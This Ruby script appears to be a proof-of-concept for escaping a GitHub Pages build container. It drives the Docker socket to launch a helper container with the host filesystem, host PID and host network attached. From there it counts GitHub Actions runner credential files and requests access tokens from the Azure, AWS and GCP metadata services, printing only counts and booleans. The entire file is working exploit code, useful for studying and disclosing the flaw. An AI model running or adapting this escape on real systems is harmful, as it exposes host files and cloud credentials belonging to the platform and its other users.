require 'json'
require 'securerandom'
require 'socket'

MARKER = 'PAGES_CROSS_ACCOUNT_MARKER_6f7d5214d9e84f87'

def docker_request(method, path, body = nil)
  payload = body.nil? ? '' : JSON.generate(body)
  socket = UNIXSocket.new('/var/run/docker.sock')
  request = "#{method} #{path} HTTP/1.0\r\nHost: docker\r\nConnection: close\r\n"
  unless payload.empty?
    request += "Content-Type: application/json\r\n"
    request += "Content-Length: #{payload.bytesize}\r\n"
  end
  socket.write(request + "\r\n" + payload)
  raw = socket.read
  socket.close
  status = raw.lines.first.to_s.split[1].to_i
  response_body = raw.split("\r\n\r\n", 2)[1].to_s
  parsed = JSON.parse(response_body) rescue nil
  [status, parsed, response_body]
rescue
  [0, nil, '']
end

sleep 12
list_status, containers, = docker_request('GET', '/containers/json?all=1')
containers = [] unless containers.is_a?(Array)
marker_seen = false
containers.each do |entry|
  identifier = entry['Id'].to_s
  next if identifier.empty?

  inspect_status, details, = docker_request('GET', "/containers/#{identifier}/json")
  next unless inspect_status == 200 && details.is_a?(Hash)

  env = details.dig('Config', 'Env')
  marker_seen ||= env.is_a?(Array) && env.include?("PAGES_CROSS_ACCOUNT_MARKER=#{MARKER}")
end

inner = <<~'RUBY'
  require 'json'
  require 'net/http'
  require 'socket'
  require 'uri'

  def request(method, url, headers = {})
    uri = URI(url)
    klass = method == 'PUT' ? Net::HTTP::Put : Net::HTTP::Get
    req = klass.new(uri)
    headers.each { |key, value| req[key] = value }
    response = Net::HTTP.start(
      uri.host,
      uri.port,
      use_ssl: false,
      open_timeout: 2,
      read_timeout: 3
    ) { |http| http.request(req) }
    [response.code.to_i, response.body.to_s]
  rescue
    [0, '']
  end

  credential_patterns = [
    '/host/home/runner/runners/*/.credentials',
    '/host/home/runner/actions-runner*/.credentials',
    '/host/runner/.credentials'
  ]
  rsa_patterns = [
    '/host/home/runner/runners/*/.credentials_rsaparams',
    '/host/home/runner/actions-runner*/.credentials_rsaparams',
    '/host/runner/.credentials_rsaparams'
  ]
  runner_patterns = [
    '/host/home/runner/runners/*/.runner',
    '/host/home/runner/actions-runner*/.runner',
    '/host/runner/.runner'
  ]
  credential_files = credential_patterns.flat_map { |pattern| Dir.glob(pattern) }.uniq
  rsa_files = rsa_patterns.flat_map { |pattern| Dir.glob(pattern) }.uniq
  runner_files = runner_patterns.flat_map { |pattern| Dir.glob(pattern) }.uniq
  runner_processes = Dir.glob('/host/proc/[0-9]*/cmdline').count do |path|
    value = (File.binread(path, 4096) rescue '').to_s
    value.include?('Runner.Listener') || value.include?('Runner.Worker')
  end

  canary_dns = begin
    !Addrinfo.getaddrinfo('ssrf-target.iad.github.net', 80, nil, :STREAM).empty?
  rescue
    false
  end

  azure_status, azure_body = request(
    'GET',
    'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F',
    {'Metadata' => 'true'}
  )
  azure_json = JSON.parse(azure_body) rescue {}
  azure_token = !azure_json['access_token'].to_s.empty?

  aws_token_status, aws_token = request(
    'PUT',
    'http://169.254.169.254/latest/api/token',
    {'X-aws-ec2-metadata-token-ttl-seconds' => '60'}
  )
  aws_role_status = 0
  aws_credentials = false
  if aws_token_status == 200 && !aws_token.empty?
    aws_role_status, aws_role = request(
      'GET',
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      {'X-aws-ec2-metadata-token' => aws_token}
    )
    role = aws_role.lines.first.to_s.strip
    if aws_role_status == 200 && role.match?(/\A[A-Za-z0-9+=,.@_-]+\z/)
      aws_credential_status, aws_body = request(
        'GET',
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/#{role}",
        {'X-aws-ec2-metadata-token' => aws_token}
      )
      aws_json = JSON.parse(aws_body) rescue {}
      aws_credentials = aws_credential_status == 200 &&
        !aws_json['AccessKeyId'].to_s.empty? &&
        !aws_json['Token'].to_s.empty?
    end
  end

  gcp_status, gcp_body = request(
    'GET',
    'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token',
    {'Metadata-Flavor' => 'Google'}
  )
  gcp_json = JSON.parse(gcp_body) rescue {}
  gcp_token = gcp_status == 200 && !gcp_json['access_token'].to_s.empty?

  puts [
    'host_root_readable=' + File.readable?('/host/etc').to_s,
    'runner_credential_files=' + credential_files.length.to_s,
    'runner_rsa_files=' + rsa_files.length.to_s,
    'runner_config_files=' + runner_files.length.to_s,
    'runner_processes=' + runner_processes.to_s,
    'canary_dns=' + canary_dns.to_s,
    'azure_status=' + azure_status.to_s,
    'azure_token=' + azure_token.to_s,
    'aws_token_status=' + aws_token_status.to_s,
    'aws_role_status=' + aws_role_status.to_s,
    'aws_credentials=' + aws_credentials.to_s,
    'gcp_status=' + gcp_status.to_s,
    'gcp_token=' + gcp_token.to_s
  ].join(' ')
RUBY

current_status, current, = docker_request('GET', "/containers/#{ENV['HOSTNAME']}/json")
image = current.is_a?(Hash) ? current['Image'].to_s : ''
name = "pages-host-readonly-#{SecureRandom.hex(6)}"
container_id = ''
create_status = 0
start_status = 0
wait_status = 0
delete_status = 0
helper_exit_code = -1
helper_state_error = false
host_mount_seen = false
host_mount_readonly = false
helper_logs_nonempty = false
host_result = 'host_root_readable=false runner_credential_files=-1 runner_rsa_files=-1 runner_config_files=-1 runner_processes=-1 canary_dns=false azure_status=0 azure_token=false aws_token_status=0 aws_role_status=0 aws_credentials=false gcp_status=0 gcp_token=false'

unless image.empty?
  config = {
    'Image' => image,
    'Entrypoint' => ['ruby'],
    'Cmd' => ['-e', inner],
    'NetworkDisabled' => false,
    'HostConfig' => {
      'Binds' => ['/:/host:ro'],
      'PidMode' => 'host',
      'NetworkMode' => 'host',
      'AutoRemove' => false
    }
  }
  begin
    create_status, created, = docker_request('POST', "/containers/create?name=#{name}", config)
    container_id = created.is_a?(Hash) ? created['Id'].to_s : ''
    unless container_id.empty?
      start_status, = docker_request('POST', "/containers/#{container_id}/start")
      wait_status, waited, = docker_request('POST', "/containers/#{container_id}/wait")
      helper_exit_code = waited.is_a?(Hash) ? waited['StatusCode'].to_i : -1
      inspect_status, inspected, = docker_request('GET', "/containers/#{container_id}/json")
      if inspect_status == 200 && inspected.is_a?(Hash)
        helper_state_error = !inspected.dig('State', 'Error').to_s.empty?
        mounts = inspected['Mounts'].is_a?(Array) ? inspected['Mounts'] : []
        host_mount = mounts.find { |mount| mount['Destination'].to_s == '/host' }
        host_mount_seen = !host_mount.nil?
        host_mount_readonly = host_mount.is_a?(Hash) && host_mount['RW'] == false
      end
      _, _, logs = docker_request('GET', "/containers/#{container_id}/logs?stdout=1&stderr=1")
      logs = logs.encode('UTF-8', invalid: :replace, undef: :replace, replace: '')
      helper_logs_nonempty = !logs.empty?
      fields = {
        'host_root_readable' => ['(?:true|false)', 'false'],
        'runner_credential_files' => ['-?\\d+', '-1'],
        'runner_rsa_files' => ['-?\\d+', '-1'],
        'runner_config_files' => ['-?\\d+', '-1'],
        'runner_processes' => ['-?\\d+', '-1'],
        'canary_dns' => ['(?:true|false)', 'false'],
        'azure_status' => ['\\d+', '0'],
        'azure_token' => ['(?:true|false)', 'false'],
        'aws_token_status' => ['\\d+', '0'],
        'aws_role_status' => ['\\d+', '0'],
        'aws_credentials' => ['(?:true|false)', 'false'],
        'gcp_status' => ['\\d+', '0'],
        'gcp_token' => ['(?:true|false)', 'false']
      }
      host_result = fields.map do |field, (pattern, fallback)|
        match = logs.match(/#{field}=(#{pattern})/)
        "#{field}=#{match ? match[1] : fallback}"
      end.join(' ')
    end
  ensure
    unless container_id.empty?
      delete_status, = docker_request('DELETE', "/containers/#{container_id}?force=1&v=1")
    end
  end
end

post_status, post_containers, = docker_request('GET', '/containers/json?all=1')
post_count = post_containers.is_a?(Array) ? post_containers.length : -1

[
  'execution=true',
  "list_status=#{list_status}",
  "container_count=#{containers.length}",
  "cross_account_marker_seen=#{marker_seen}",
  "current_status=#{current_status}",
  "create_status=#{create_status}",
  "start_status=#{start_status}",
  "wait_status=#{wait_status}",
  "helper_exit_code=#{helper_exit_code}",
  "helper_state_error=#{helper_state_error}",
  "host_mount_seen=#{host_mount_seen}",
  "host_mount_readonly=#{host_mount_readonly}",
  "helper_logs_nonempty=#{helper_logs_nonempty}",
  host_result,
  "delete_status=#{delete_status}",
  "post_status=#{post_status}",
  "post_container_count=#{post_count}"
].join(' ')
